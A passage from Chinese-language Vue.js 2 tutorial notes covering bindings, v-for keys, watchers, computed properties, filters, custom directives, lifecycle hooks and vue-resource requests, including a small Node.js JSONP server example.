isactive的值有true或false*/\n```\n\n3. 数组中嵌套对象\n```html\n<h1 :class=\"['red', 'thin', {'active': isactive}]\">这是一个邪恶的H1</h1>\n/*其中isactive是你在vue中data中定义的变量， 当isactive的值为false时， 这个class属性将没有active类选择器，如果为true，则有*/\n```\n\n4. 直接使用对象\n```html\n<h1 :class=\"{red:true, italic:true, active:true, thin:true}\">这是一个邪恶的H1</h1>\n/*原理同上一点， 其中red、italic等都是类选择器*/\n```\n\n## 使用内联样式\n1. 直接在元素上通过 `:style` 的形式，书写样式对象\n```html\n<h1 :style=\"{color: 'red', 'font-size': '40px'}\">这是一个善良的H1</h1>\n```\n\n2. 将样式对象，定义到 `data` 中，并直接引用到 `:style` 中\n在data上定义样式：\n```css\ndata: {\n     h1StyleObj: { color: 'red', 'font-size': '40px', 'font-weight': '200' }\n}\n```\n在元素中，通过属性绑定的形式，将样式对象应用到元素中：\n```html\n<h1 :style=\"h1StyleObj\">这是一个善良的H1</h1>\n```\n\n3. 在 `:style` 中通过数组，引用多个 `data` 上的样式对象\n在data上定义样式：\n```css\ndata: {\n    h1StyleObj: { color: 'red', 'font-size': '40px', 'font-weight': '200' },\n    h1StyleObj2: { fontStyle: 'italic' }\n}\n```\n在元素中，通过属性绑定的形式，将样式对象应用到元素中：\n```html\n<h1 :style=\"[h1StyleObj, h1StyleObj2]\">这是一个善良的H1</h1>\n```\n\n## v-for和key属性\n\n### 用 v-for 把一个数组对应为一组元素\n我们可以用 v-for 指令基于一个数组来渲染一个列表。v-for 指令需要使用 item in items 形式的特殊语法，其中 items 是源数据数组，而 item 则是被迭代的数组元素的别名。\n```html\n<div id=\"example-1\">\n  <div v-for=\"item in items\" :key=\"item.message\">\n    {{ item.message }}\n  </div>\n</div>\n```\n```js\nvar example1 = new Vue({\n  el: '#example-1',\n  data: {\n    items: [\n      { message: 'Foo' },\n      { message: 'Bar' }\n    ]\n  }\n})\n```\n结果：\n```\nFoo\nBar\n```\n在 v-for 块中，我们可以访问所有父作用域的 property。v-for 还支持一个可选的第二个参数，即当前项的索引。\n```html\n<div id=\"example-2\">\n  <div v-for=\"(item, index) in items\">\n    {{ parentMessage }} - {{ index }} - {{ item.message }}\n  </div>\n</div>\n```\n```js\nvar example2 = new Vue({\n  el: '#example-2',\n  data: {\n    parentMessage: 'Parent',\n    items: [\n      { message: 'Foo' },\n      { message: 'Bar' }\n    ]\n  }\n})\n```\n结果：\n```\nParent-0-Foo\nParent-1-Bar\n```\n你也可以用 of 替代 in 作为分隔符，因为它更接近 JavaScript 迭代器的语法：\n```html\n<div v-for=\"item of items\"></div>\n```\n\n### 在 v-for 里使用对象\n你也可以用 v-for 来遍历一个对象的 property。\n```html\n<div id=\"v-for-object\" class=\"demo\">\n  <div v-for=\"value in object\">\n    {{ value }}\n  </div>\n</div>\n```\n```js\nnew Vue({\n  el: '#v-for-object',\n  data: {\n    object: {\n      title: 'How to do lists in Vue',\n      author: 'Jane Doe',\n      publishedAt: '2016-04-10'\n    }\n  }\n})\n```\n结果：\n```\nHow to do lists in Vue\nJane Doe\n2016-04-10\n```\n\n你也可以提供第二个的参数为 property 名称 (也就是键名)：\n```html\n<div v-for=\"(value, name) in object\">\n  {{ name }}: {{ value }}\n</div>\n```\n结果：\n```\ntitle: How to do lists in Vue\nauthor: Jane Doe\npublishedAt: 2016-04-10\n```\n\n还可以用第三个参数作为索引：\n```html\n<div v-for=\"(value, name, index) in object\">\n  {{ index }}. {{ name }}: {{ value }}\n</div>\n```\n结果：\n```\n0. title: How to do lists in Vue\n1. author: Jane Doe\n2. publishedAt: 2016-04-10\n```\n\n### 迭代时调用方法\n```html\n<p v-for=\"item in search(keywords)\">这是第 {{i}} 个P标签</p>\n/*这个search是vue中的methods中定义的方法， keywords是vue中data的的变量， 这个遍历的数组是执行search(keywords)方法后得到的数组*/\n```\n\n### v-for必须要有key\n> 2.2.0+ 的版本里，**当在组件中使用** v-for 时，key 现在是必须的。\n\n当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “**就地复用**” 策略。如果数据项的顺序被改变，Vue将**不是移动 DOM 元素来匹配数据项的顺序**， 而是**简单复用此处每个元素**，并且确保它在特定索引下显示已被渲染过的每个元素。\n\n为了给 Vue 一个提示，**以便它能跟踪每个节点的身份，从而重用和重新排序现有元素**，你需要为每项提供一个唯一 key 属性。\n```html\n<body>\n  <div id=\"app\">\n    <div>\n      <label>Id:\n        <input type=\"text\" v-model=\"id\">\n      </label>\n      <label>Name:\n        <input type=\"text\" v-model=\"name\">\n      </label>\n      <input type=\"button\" value=\"添加\" @click=\"add\">\n    </div>\n    <!-- 注意： v-for 循环的时候，key 属性只能使用 number获取string -->\n    <!-- 注意： key 在使用的时候，必须使用 v-bind 属性绑定的形式，指定 key 的值 -->\n    <!-- 在组件中，使用v-for循环的时候，或者在一些特殊情况中，如果 v-for 有问题，必须 在使用 v-for 的同时，指定 唯一的 字符串/数字 类型 :key 值 -->\n    <p v-for=\"item in list\" :key=\"item.id\">\n      <input type=\"checkbox\">{{item.id}} --- {{item.name}}\n    </p>\n  </div>\n  <script>\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        id: '',\n        name: '',\n        list: [\n          { id: 1, name: '李斯' },\n          { id: 2, name: '嬴政' },\n          { id: 3, name: '赵高' },\n          { id: 4, name: '韩非' },\n          { id: 5, name: '荀子' }\n        ]\n      },\n      methods: {\n        add() { // 添加方法\n          this.list.unshift({ id: this.id, name: this.name })\n        }\n      }\n    });\n  </script>\n</body>\n```\n\n## v-if和v-show\nv-if 与 v-show都是用来控制元素的显示的\nv-if 的特点：每次都会重新删除或创建元素\nv-show 的特点： 每次不会重新进行DOM的删除和创建操作，只是切换了元素的 display:none 样式\n\n> 一般来说，v-if 有更高的切换消耗而 v-show 有更高的初始渲染消耗。因此，如果需要频繁切换 v-show 较好，如果在运行时条件不大可能改变 v-if 较好。\n\n```html\n<body>\n  <div id=\"app\">\n    <!-- <input type=\"button\" value=\"toggle\" @click=\"toggle\"> -->\n    <input type=\"button\" value=\"toggle\" @click=\"flag=!flag\">\n    <h3 v-if=\"flag\">这是用v-if控制的元素</h3>\n    <h3 v-show=\"flag\">这是用v-show控制的元素</h3>\n  </div>\n  <script>\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        flag: false\n      },\n      methods: {\n        /* toggle() {\n          this.flag = !this.flag\n        } */\n      }\n    });\n  </script>\n</body>\n```\n## watch属性的使用\n考虑一个问题：想要实现 `名` 和 `姓` 两个文本框的内容改变，则全名的文本框中的值也跟着改变；（用以前的知识如何实现？？？）\n1. 监听`data`中属性的改变：\n```html\n<div id=\"app\">\n    <input type=\"text\" v-model=\"firstName\"> +\n    <input type=\"text\" v-model=\"lastName\"> =\n    <span>{{fullName}}</span>\n  </div>\n\n  <script>\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        firstName: 'jack',\n        lastName: 'chen',\n        fullName: 'jack - chen'\n      },\n      methods: {},\n      watch: {\n        'firstName': function (newVal, oldVal) { // 第一个参数是新数据，第二个参数是旧数据\n          this.fullName = newVal + ' - ' + this.lastName;\n        },\n        'lastName': function (newVal, oldVal) {\n          this.fullName = this.firstName + ' - ' + newVal;\n        }\n      }\n    });\n  </script>\n```\n\n2. 监听路由对象的改变：\n```html\n<div id=\"app\">\n    <router-link to=\"/login\">登录</router-link>\n    <router-link to=\"/register\">注册</router-link>\n    <router-view></router-view>\n</div>\n\n<script>\nvar login = Vue.extend({\n  template: '<h1>登录组件</h1>'\n});\n\nvar register = Vue.extend({\n  template: '<h1>注册组件</h1>'\n});\n\nvar router = new VueRouter({\n  routes: [\n    { path: \"/login\", component: login },\n    { path: \"/register\", component: register }\n  ]\n});\n\n// 创建 Vue 实例，得到 ViewModel\nvar vm = new Vue({\n  el: '#app',\n  data: {},\n  methods: {},\n  router: router,\n  watch: {\n    '$route': function (newVal, oldVal) {\n      if (newVal.path === '/login') {\n        console.log('这是登录组件');\n      }\n    }\n  }\n});\n</script>\n```\n\n## computed计算属性的使用\n1. 默认只有`getter`的计算属性：\n```html\n<div id=\"app\">\n    <input type=\"text\" v-model=\"firstName\"> +\n    <input type=\"text\" v-model=\"lastName\"> =\n    <span>{{fullName}}</span>\n  </div>\n\n  <script>\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        firstName: 'jack',\n        lastName: 'chen'\n      },\n      methods: {},\n      computed: { // 计算属性； 特点：当计算属性中所有用到的任何一个data属性改变之后，都会重新触发本计算属性 的重新计算，从而更新fullName的值\n        fullName() {\n          return this.firstName + ' - ' + this.lastName;\n        }\n      }\n    });\n  </script>\n```\n\n2. 定义有`getter`和`setter`的计算属性：\n\n```html\n<div id=\"app\">\n    <input type=\"text\" v-model=\"firstName\">\n    <input type=\"text\" v-model=\"lastName\">\n    <!-- 点击按钮重新为 计算属性 fullName 赋值 -->\n    <input type=\"button\" value=\"修改fullName\" @click=\"changeName\">\n\n    <span>{{fullName}}</span>\n  </div>\n\n  <script>\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        firstName: 'jack',\n        lastName: 'chen'\n      },\n      methods: {\n        changeName() {\n          this.fullName = 'TOM - chen2';\n        }\n      },\n      computed: {\n        fullName: {\n          get: function () {\n            return this.firstName + ' - ' + this.lastName;\n          },\n          set: function (newVal) {\n            var parts = newVal.split(' - ');\n            this.firstName = parts[0];\n            this.lastName = parts[1];\n          }\n        }\n      }\n    });\n  </script>\n\n```\n\n## watch、computed和methods之间的对比\n1. `computed`属性的结果会被缓存，除非依赖的响应式属性变化才会重新计算。主要当作属性来使用；\n2. `methods`方法表示一个具体的操作，主要书写业务逻辑；\n3. `watch`一个对象，键是需要观察的表达式，值是对应回调函数。主要用来监听某些特定数据的变化，从而进行某些具体的业务逻辑操作；可以看作是`computed`和`methods`的结合体；\n\n# 过滤器\n概念：Vue.js 允许你自定义过滤器，**可被用作一些常见的文本格式化**。过滤器可以用在两个地方：**mustache 插值和 v-bind 表达式**。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符指示；\n过滤器基本使用：\n```html\n<body>\n  <div id=\"app\">\n    /*此时msg变量会当作第一个实参传给msgFormat方法，将得到的结果再传给test方法， 最后得到的结果就是这个插值表达式的结果*/\n    <p>{{ msg | msgFormat('疯狂+1', '123') | test }}</p>\n  </div>\n  <script>\n    // 定义一个 Vue 全局的过滤器，名字叫做  msgFormat\n    Vue.filter('msgFormat', function (msg, arg, arg2) {\n      // 字符串的  replace 方法，第一个参数，除了可写一个 字符串之外，还可以定义一个正则\n      return msg.replace(/单纯/g, arg + arg2)\n    })\n\n    Vue.filter('test', function (msg) {\n      return msg + '========'\n    })\n\n    // 创建 Vue 实例，得到 ViewModel\n    var vm = new Vue({\n      el: '#app',\n      data: {\n        msg: '曾经，我也是一个单纯的少年，单纯的我，傻傻的问，谁是世界上最单纯的男人'\n      },\n      methods: {}\n    });\n  </script>\n</body>\n```\n\n## 私有过滤器\n1. HTML元素：\n```html\n<td>{{item.ctime | dataFormat('yyyy-mm-dd')}}</td>\n```\n\n2. 私有 `filters` 定义方式：\n```js\nfilters: { // 私有局部过滤器，只能在 当前 VM 对象所控制的 View 区域进行使用\n    dataFormat(input, pattern = \"\") { // 在参数列表中 通过 pattern=\"\" 来指定形参默认值，防止报错\n      var dt = new Date(input);\n      // 获取年月日\n      var y = dt.getFullYear();\n      var m = (dt.getMonth() + 1).toString().padStart(2, '0');\n      var d = dt.getDate().toString().padStart(2, '0');\n      // 如果 传递进来的字符串类型，转为小写之后，等于 yyyy-mm-dd，那么就返回 年-月-日\n      // 否则，就返回  年-月-日 时：分：秒\n      if (pattern.toLowerCase() === 'yyyy-mm-dd') {\n        return `${y}-${m}-${d}`;\n      } else {\n        // 获取时分秒\n        var hh = dt.getHours().toString().padStart(2, '0');\n        var mm = dt.getMinutes().toString().padStart(2, '0');\n        var ss = dt.getSeconds().toString().padStart(2, '0');\n        return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;\n      }\n    }\n  }\n```\n\n> 使用ES6中的字符串新方法 String.prototype.padStart(maxLength, fillString='') 或 String.prototype.padEnd(maxLength, fillString='')来填充字符串；\n\n\n## 全局过滤器\n```js\n// 定义一个全局过滤器\nVue.filter('dataFormat', function (input, pattern = '') {//如果pattern没传值，则默认为'';\n  var dt = new Date(input);\n  // 获取年月日\n  var y = dt.getFullYear();\n  var m = (dt.getMonth() + 1).toString().padStart(2, '0');\n  var d = dt.getDate().toString().padStart(2, '0');\n  // 如果 传递进来的字符串类型，转为小写之后，等于 yyyy-mm-dd，那么就返回 年-月-日\n  // 否则，就返回  年-月-日 时：分：秒\n  if (pattern.toLowerCase() === 'yyyy-mm-dd') {\n    return `${y}-${m}-${d}`;\n  } else {\n    // 获取时分秒\n    var hh = dt.getHours().toString().padStart(2, '0');\n    var mm = dt.getMinutes().toString().padStart(2, '0');\n    var ss = dt.getSeconds().toString().padStart(2, '0');\n    return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;\n  }\n});\n```\n> 注意：当有局部和全局两个名称相同的过滤器时候，会以就近原则进行调用，即：局部过滤器优先于全局过滤器被调用！\n\n## 键盘修饰符\n在监听键盘事件时，我们经常需要检查详细的按键。Vue 允许为 v-on 在监听键盘事件时添加按键修饰符：\n```html\n<!-- 只有在 `key` 是 `Enter` 时调用 `vm.submit()` -->\n<input v-on:keyup.enter=\"submit\">\n```\n你可以直接将 KeyboardEvent.key 暴露的任意有效按键名转换为 kebab-case 来作为修饰符。\n```html\n<input v-on:keyup.page-down=\"onPageDown\">\n```\n在上述示例中，处理函数只会在 $event.key 等于 PageDown 时被调用。\n\n### 按键码\nkeyCode 的事件用法已经被废弃了并可能不会被最新的浏览器支持。\n使用 keyCode 特性也是允许的：\n```\n<input v-on:keyup.13=\"submit\">\n```\n为了在必要的情况下支持旧浏览器，Vue 提供了绝大多数常用的按键码的别名：\n```\n.enter\n.tab\n.delete (捕获“删除”和“退格”键)\n.esc\n.space\n.up\n.down\n.left\n.right\n```\n\n有一些按键 (.esc 以及所有的方向键) 在 IE9 中有不同的 key 值, 如果你想支持 IE9，这些内置的别名应该是首选。\n### 自定义键盘修饰符\n1.x中自定义键盘修饰符【了解即可】\n```css\nVue.directive('on').keyCodes.f2 = 113;\n```\n\n2.x中自定义键盘修饰符\n通过`Vue.config.keyCodes.名称 = 按键值`来自定义案件修饰符的别名：\n```css\nVue.config.keyCodes.f2 = 113; /*其中f2键的keycode码113*/\n```\n使用自定义的按键修饰符：\n```html\n<input type=\"text\" v-model=\"name\" @keyup.f2=\"add\">\n```\n[js 里面的键盘事件对应的键码](https://www.cnblogs.com/wuhua1/p/6686237.html)\n\n\n## 自定义指令\n[自定义指令官网链接](https://cn.vuejs.org/v2/guide/custom-directive.html)\n```js\n    <input type=\"text\" v-focus v-color=\"'green'\"> \n\n    // 使用  Vue.directive()来定义全局的指令v-focus\n    // 其中：参数1 ： 指令的名称，注意，在定义的时候，指令的名称前面，不需要加 v- 前缀,\n    // 但是： 在调用的时候，必须 在指令名称前 加上 v- 前缀来进行调用\n    //  参数2： 是一个对象，这个对象身上，有一些指令相关的函数，这些函数可以在特定的阶段，执行相关的操作\n    Vue.directive('focus', {\n      bind: function (el) { // 每当指令绑定到元素上的时候，会立即执行这个 bind 函数，只执行一次\n        // 注意： 在每个 函数中，第一个参数，永远是 el ，表示 被绑定了指令的那个元素，这个 el 参数，是一个原生的JS对象\n        // 在元素 刚绑定了指令的时候，还没有插入到 DOM中去，这时候，调用focus方法没有作用\n        //  因为，一个元素，只有插入DOM之后，才能获取焦点\n        // el.focus()\n      },\n      inserted: function (el) { // inserted 表示元素 插入到DOM中的时候，会执行 inserted 函数【触发1次】\n        el.focus()\n        // 和JS行为有关的操作，最好在 inserted 中去执行，防止JS行为不生效\n      },\n      updated: function (el) { // 当VNode更新的时候，会执行updated， 可能会触发多次\n      }\n    })\n\n    // 自定义一个 设置字体颜色的 指令\n    Vue.directive('color', {\n      // 样式，只要通过指令绑定给了元素，不管这个元素有没有被插入到页面中去，这个元素肯定有了一个内联的样式\n      // 将来元素肯定会显示到页面中，这时候，浏览器的渲染引擎必然会解析样式，应用给这个元素\n      bind: function (el, binding) {\n        // el.style.color = 'red'\n        // console.log(binding.name)\n        // 和样式相关的操作，一般都可以在 bind 执行\n        // console.log(binding.value)\n        // console.log(binding.expression)\n        el.style.color = binding.value\n      }\n    })\n```\n\n自定义全局和局部的自定义指令：\n```css\n// 自定义全局指令 v-focus，为绑定的元素自动获取焦点：\nVue.directive('focus', {\n  inserted: function (el) { // inserted 表示被绑定元素插入父节点时调用\n    el.focus();\n  }\n});\n\n// 自定义局部指令 v-color 和 v-font-weight，为绑定的元素设置指定的字体颜色 和 字体粗细：\n  directives: {\n    color: { // 为元素设置指定的字体颜色\n      bind(el, binding) {\n        el.style.color = binding.value;\n      }\n    },\n   'font-weight': function (el, binding2) { // 自定义指令的简写形式，等同于定义了 bind 和 update 两个钩子函数\n      el.style.fontWeight = binding2.value;\n    }\n  }\n```\n\n自定义指令的使用方式：\n```html\n<input type=\"text\" v-model=\"searchName\" v-focus v-color=\"'red'\" v-font-weight=\"900\">\n```\n\n# vue实例的生命周期\n[vue实例的生命周期官网链接](https://cn.vuejs.org/v2/guide/instance.html#实例生命周期)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409120503.png)\n\n什么是生命周期：从Vue实例创建、运行、到销毁期间，总是伴随着各种各样的事件，这些事件，统称为生命周期！\n[生命周期钩子](https://cn.vuejs.org/v2/api/#选项-生命周期钩子)：就是生命周期事件的别名而已；\n生命周期钩子 = 生命周期函数 = 生命周期事件\n\n主要的生命周期函数分类：\n- 创建期间的生命周期函数：\n```\nbeforeCreate： 实例刚在内存中被创建出来，此时，还没有初始化好 data 和 methods 属性\ncreated： 实例已经在内存中创建OK，此时 data 和 methods 已经创建OK，此时还没有开始 编译模板\nbeforeMount： 此时已经完成了模板的编译，但是还没有挂载到页面中\nmounted： 此时，已经将编译好的模板，挂载到了页面指定的容器中显示\n```\n- 运行期间的生命周期函数：\n```\nbeforeUpdate： 状态更新之前执行此函数， 此时 data 中的状态值是最新的，但是界面上显示的 数据还是旧的，因为此时还没有开始重新渲染DOM节点\nupdated： 实例更新完毕之后调用此函数，此时 data 中的状态值 和 界面上显示的数据，都已经完成了更新，界面已经被重新渲染好了！\n```\n- 销毁期间的生命周期函数：\n```\nbeforeDestroy： 实例销毁之前调用。在这一步，实例仍然完全可用。\ndestroyed： Vue实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。\n```\n\n```html\n<body>\n<div id=\"app\">\n  <input type=\"button\" value=\"修改msg\" @click=\"msg='No'\">\n  <h3 id=\"h3\">{{ msg }}</h3>\n</div>\n\n<script>\n  // 创建 Vue 实例，得到 ViewModel\n  var vm = new Vue({\n    el: '#app',\n    data: {\n      msg: 'ok'\n    },\n    methods: {\n      show() {\n        console.log('执行了show方法')\n      }\n    },\n    beforeCreate() { // 这是我们遇到的第一个生命周期函数，表示实例完全被创建出来之前，会执行它\n      // console.log(this.msg)\n      // this.show()\n      // 注意： 在 beforeCreate 生命周期函数执行的时候，data 和 methods 中的 数据都还没有没初始化\n    },\n    created() { // 这是遇到的第二个生命周期函数\n      // console.log(this.msg)\n      // this.show()\n      //  在 created 中，data 和 methods 都已经被初始化好了！\n      // 如果要调用 methods 中的方法，或者操作 data 中的数据，最早，只能在 created 中操作\n    },\n    beforeMount() { // 这是遇到的第3个生命周期函数，表示 模板已经在内存中编辑完成了，但是尚未把 模板渲染到 页面中\n      // console.log(document.getElementById('h3').innerText)\n      // 在 beforeMount 执行的时候，页面中的元素，还没有被真正替换过来，只是之前写的一些模板字符串\n    },\n    mounted() { // 这是遇到的第4个生命周期函数，表示，内存中的模板，已经真实的挂载到了页面中，用户已经可以看到渲染好的页面了\n      // console.log(document.getElementById('h3').innerText)\n      // 注意： mounted 是 实例创建期间的最后一个生命周期函数，当执行完 mounted 就表示，实例已经被完全创建好了，此时，如果没有其它操作的话，这个实例，就静静的 躺在我们的内存中，一动不动\n    },\n    // 接下来的是运行中的两个事件\n    beforeUpdate() { // 这时候，表示 我们的界面还没有被更新【数据被更新了吗？  数据肯定被更新了】\n      /* console.log('界面上元素的内容：' + document.getElementById('h3').innerText)\n      console.log('data 中的 msg 数据是：' + this.msg) */\n      // 得出结论： 当执行 beforeUpdate 的时候，页面中的显示的数据，还是旧的，此时 data 数据是最新的，页面尚未和 最新的数据保持同步\n    },\n    updated() {\n      console.log('界面上元素的内容：' + document.getElementById('h3').innerText)\n      console.log('data 中的 msg 数据是：' + this.msg)\n      // updated 事件执行的时候，页面和 data 数据已经保持同步了，都是最新的\n    }\n  });\n</script>\n</body>\n```\n\n# vue.js中created()、activated()、deactivated()理解\n- created()：在创建vue对象时，当html渲染之前触发；但是注意，全局vue.js不强制刷新或者重启时只创建一次，也就是说，created()只会触发一次；\n- activated()：在vue对象存活的情况下，进入当前存在activated()函数的页面时，一进入页面就触发；可用于初始化页面数据、keepalive缓存组件后，可执行方法；\n- deactivated()：离开组件时执行；\n\n<font color=\"red\">注意：activated()和deactivated()只有在`<keep-alive></keep-alive>`包裹的时候才有效；</font>\n\n例：\n新建两个组件，compA，compB：\n```vue\n<template>\n<div class=\"app\">\n    我是组件A\n</div>\n</template>\n \n<script>\n    export default{\n        name: \"compA\",\n        data(){\n            return {\n               \n            }\n        },\n        created(){\n            console.log('created');\n        },\n        activated(){\n            console.log('activated');\n        },\n        deactivated(){\n            console.log('deactivated');\n        }\n    }\n</script>\n``` \n同理建compB；\n在view中引用两个组件：\n```vue\n<template>\n<div class=\"app\">\n    <div class=\"bth\">\n        <button @click=\"currentComponent='compA'\">A</button>\n        <button @click=\"currentComponent='compB'\">B</button>    \n    </div>\n</div>\n<keep-alive>\n    <component :is=\"currentComponent\"></component>\n</keep-alive>\n</template>\n \n<script>\n    import compA from './component/compA'\n    import compB from './component/compB'\n    export default{\n        name: \"App\",\n        component: {\n            compA, compB\n        },\n        data(){\n            return {\n                currentComponent: 'compA'\n            }\n        }\n    }\n</script>\n``` \n在点击切换B组件时，A组件的deactivated()会执行；\n注：:is后绑定组件名，渲染当前组件；\n\n# vue-resource实现get,post,jsonp请求\n[官网链接](https://github.com/pagekit/vue-resource)\n除了 vue-resource 之外，还可以使用 `axios` 的第三方包实现实现数据的请求\n\n1. 之前的学习中，如何发起数据请求？\n2. 常见的数据请求类型？  get  post jsonp\n3. 测试的URL请求资源地址：\n- get请求地址： http://vue.studyit.io/api/getlunbo\n- post请求地址：http://vue.studyit.io/api/post\n- jsonp请求地址：http://vue.studyit.io/api/jsonp\n\n## JSONP的实现原理\n- 由于浏览器的安全性限制，不允许AJAX访问 协议不同、域名不同、端口号不同的 数据接口，浏览器认为这种访问不安全；\n- 由于凡是拥有scr这个属性的标签都可以跨域例如\\<script>\\<img>\\<iframe>，所以可以通过动态创建script标签的形式，把script标签的src属性，指向数据接口的地址，因为script标签不存在跨域限制，这种数据获取方式，称作JSONP（注意：根据JSONP的实现原理，知晓，JSONP只支持Get请求）；\n- 具体实现过程：\n- 先在客户端定义一个回调方法，预定义对数据的操作；\n  - 再把这个回调方法的名称，通过URL传参的形式，提交到服务器的数据接口；\n  - 服务器数据接口组织好要发送给客户端的数据，再拿着客户端传递过来的回调方法名称，拼接出一个调用这个方法的字符串，发送给客户端去解析执行；\n  - 客户端拿到服务器返回的字符串之后，当作Script脚本去解析执行，这样就能够拿到JSONP的数据了；\n- 带大家通过 Node.js ，来手动实现一个JSONP的请求例子；\n```js\n    const http = require('http');\n    // 导入解析 URL 地址的核心模块\n    const urlModule = require('url');\n    const server = http.createServer();\n    // 监听 服务器的 request 请求事件，处理每个请求\n    server.on('request', (req, res) => {\n      const url = req.url;\n\n      // 解析客户端请求的URL地址\n      var info = urlModule.parse(url, true);\n\n      // 如果请求的 URL 地址是 /getjsonp ，则表示要获取JSONP类型的数据\n      if (info.pathname === '/getjsonp') {\n        // 获取客户端指定的回调函数的名称\n        var cbName = info.query.callback;\n        // 手动拼接要返回给客户端的数据对象\n        var data = {\n          name: 'zs',\n          age: 22,\n          gender: '男',\n          hobby: ['吃饭', '睡觉', '运动']\n        }\n        // 拼接出一个方法的调用，在调用这个方法的时候，把要发送给客户端的数据，序列化为字符串，作为参数传递给这个调用的方法：\n        var result = `${cbName}(${JSON.stringify(data)})`;\n        // 将拼接好的方法的调用，返回给客户端去解析执行\n        res.end(result);\n      } else {\n        res.end('404');\n      }\n    });\n\n    server.listen(3000, () => {\n      console.log('server running at http://127.0.0.1:3000');\n    });\n```\n## Methods\nShortcut methods are available for all request types. These methods work globally or in a Vue instance.\n\n```js\n// global Vue object\nVue.http.get('/someUrl', [config]).then(successCallback, errorCallback);\nVue.http.post('/someUrl', [body], [config]).then(successCallback, errorCallback);\n\n// in a Vue instance\nthis.$http.get('/someUrl', [config]).then(successCallback, errorCallback);\nthis.$http.post('/someUrl', [body], [config]).then(successCallback, errorCallback);\n```\n\nList of shortcut methods:\n- `get(url, [config])`\n- `head(url, [config])`\n- `delete(url, [config])`\n- `jsonp(url, [config])`\n- `post(url, [body], [config])`\n- `put(url, [body], [config])`\n- `patch(url, [body], [config])`\n\nConfig\n\n| Parameter        | Type                           | Description                                                                                                                  |\n| ---------------- | ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------- |\n| url              | `string`                       | URL to which the request is sent                                                                                             |\n| body             | `Object`, `FormData`, `string` | Data to be sent as the request body                                                                                          |\n| headers          | `Object`                       | Headers object to be sent as HTTP request headers                                                                            |\n| params           | `Object`                       | Parameters object to be sent as URL parameters                                                                               |\n| method           | `string`                       | HTTP method (e.g. GET, POST, ...)                                                                                            |\n| responseType     | `string`                       | Type of the response body (e.g. text, blob, json, ...)                                                                       |\n| timeout          | `number`                       | Request timeout in milliseconds (`0` means no timeout)                                                                       |\n| credentials      | `boolean`                      | Indicates whether or not cross-site Access-Control requests should be made using credentials                                 |\n| emulateHTTP      | `boolean`                      | Send PUT, PATCH and DELETE requests with a HTTP POST and set the `X-HTTP-Method-Override` header                             |\n| emulateJSON      | `boolean`                      | Send request body as `application/x-www-form-urlencoded` content type                                                        |\n| before           | `function(request)`            | Callback function to modify the request object before it is sent                                                             |\n| uploadProgress   | `function(event)`              | Callback function to handle the [ProgressEvent](https://developer.mozilla.org/en-US/docs/Web/API/ProgressEvent) of uploads   |\n| downloadProgress | `function(event)`              | Callback function to handle the [ProgressEvent](https://developer.mozilla.org/en-US/docs/Web/API/ProgressEvent) of downloads |\n\nResponse\nA request resolves to a response object with the following properties and methods:\n\n| Property   | Type                       | Description                             |\n| ---------- | -------------------------- | --------------------------------------- |\n| url        | `string`                   | Response URL origin                     |\n| body       | `Object`, `Blob`, `string` | Response body                           |\n| headers    | `Header`                   | Response Headers object                 |\n| ok         | `boolean`                  | HTTP status code between 200 and 299    |\n| status     | `number`                   | HTTP status code of the response        |\n| statusText | `string`                   | HTTP status text of the response        |\n| **Method** | **Type**                   | **Description**                         |\n| text()     | `Promise`                  | Resolves the body as string             |\n| json()     | `Promise`                  | Resolves the body as parsed JSON object |\n| blob()     | `Promise`                  | Resolves the body as Blob object        |\n\nExample\n```js\n{\n // POST /someUrl\n this.$http.post('/someUrl', {foo: 'bar'}).then(response => {\n   // get status\n   response.status;\n   // get status text\n   response.statusText;\n   // get 'Expires' header\n   response.headers.get('Expires');\n   // get body data\n   this.someData = response.body;\n }, response => {\n   // error callback\n });\n}\n```\nSend a get request with URL query parameters and a custom headers.\n```js\n{\n // GET /someUrl?foo=bar\n this.$http.get('/someUrl', {params: {foo: 'bar'}, headers: {'X-Custom': '...'}}).then(response => {\n   // success callback\n }, response => {\n   // error callback\n });\n}\n```\n\n   Fetch an image and use the blob() method to extract the image body content from the response.\n\n   ```js\n   {\n     // GET /image.jpg\n     this.$http.get('/image.jpg', {responseType: 'blob'}).then(response => {\n       // resolve to Blob\n       return response.blob();\n     }).then(blob => {\n       // use image Blob\n     });\n   }\n   ```\n\n## vue-resource 的配置步骤\n- 直接在页面中，通过`script`标签，引入 `vue-resource` 的脚本文件；\n- 注意：引用的先后顺序是：先引用 `Vue` 的脚本文件，再引用 `vue-resource` 的脚本文件；\n\n## 发送请求\n1. 发送get请求\n\n```js\ngetInfo() { // get 方式获取数据\n  this.$http.get('http://127.0.0.1:8899/api/getlunbo').then(res => {\n    //通过res.body来获取服务器返回的数据\n    console.log(res.body);\n  })\n}\n```\n\n2. 发送post请求：\n\n```js\npostInfo() {\n  var url = 'http://127.0.0.1:8899/api/post';\n  // post 方法接收三个参数：\n  // 参数1： 要请求的URL地址\n  // 参数2： 要发送的数据对象\n  // 参数3： 指定post提交的编码类型为 application/x-www-form-urlencoded\n  this.$http.post(url, { name: 'zs' }, { emulateJSON: true }).then(res => {\n    console.log(res.body);\n  });\n}\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409120519.png)\n\n3. 发送JSONP请求获取数据：\n\n```js\njsonpInfo() { // JSONP形式从服务器获取数据\n  var url = 'http://127.0.0.1:8899/api/jsonp';\n  this.$http.jsonp(url).then(res => {\n    console.log(res.body);\n  });\n}\n```\n\n## 全局配置\n```js\n    // 如果我们通过全局配置了，请求的数据接口 根域名，则 ，在每次单独发起 http 请求的时候，请求的 url 路径，应该以相对路径开头，前面不能带 /  ，否则 不会启用根路径做拼接；\n    Vue.http.options.root = 'http://vue.studyit.io/';\n    // 全局启用 emulateJSON 选项\n    